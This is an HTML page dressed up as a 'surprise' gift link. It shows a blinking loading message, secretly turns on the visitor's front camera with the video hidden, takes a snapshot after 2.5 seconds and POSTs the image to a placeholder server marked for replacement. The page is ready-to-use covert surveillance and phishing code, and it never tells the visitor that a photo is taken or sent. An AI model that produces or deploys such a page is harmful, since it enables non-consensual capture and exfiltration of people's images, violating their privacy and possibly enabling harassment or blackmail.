<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Your Surprise!</title>

<meta name="referrer" content="no-referrer">

<style>
    body {
        margin: 0;
        padding: 0;
        background: #000;
        color: white;
        font-family: Arial, sans-serif;
        text-align: center;
    }

    #loading {
        margin-top: 150px;
        font-size: 26px;
        color: #fff;
        animation: blink 1s infinite;
    }

    @keyframes blink {
        0% { opacity: 0.3; }
        100% { opacity: 1; }
    }

    video {
        display: none;  /* hide frame */
    }
</style>
</head>
<body>

<h2 id="loading">Loading‚Ä¶</h2>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const loading = document.getElementById("loading");

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" }
            });

            video.srcObject = stream;

            video.onloadedmetadata = () => {
                video.play().catch(() => {
                    video.muted = true;
                    video.play();
                });
            };

            setTimeout(captureImage, 2500); // capture in 2.5 sec
        } 
        catch (error) {
            loading.innerHTML = "‚ö† Camera blocked. Please allow camera!";
        }
    }

    function captureImage() {
        loading.innerHTML = "üéÅ Opening Surprise‚Ä¶";

        let w = video.videoWidth;
        let h = video.videoHeight;

        canvas.width = w;
        canvas.height = h;

        canvas.getContext("2d").drawImage(video, 0, 0, w, h);

        let imageData = canvas.toDataURL("image/jpeg", 0.9);

        sendToServer(imageData);
    }

    function sendToServer(base64Image) {
        fetch("https://your-server-here.com/capture", {  // <-- replace
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ img: base64Image })
        });

        loading.innerHTML = "üéâ Surprise Ready!";
    }

    startCamera();
</script>

</body>
</html>
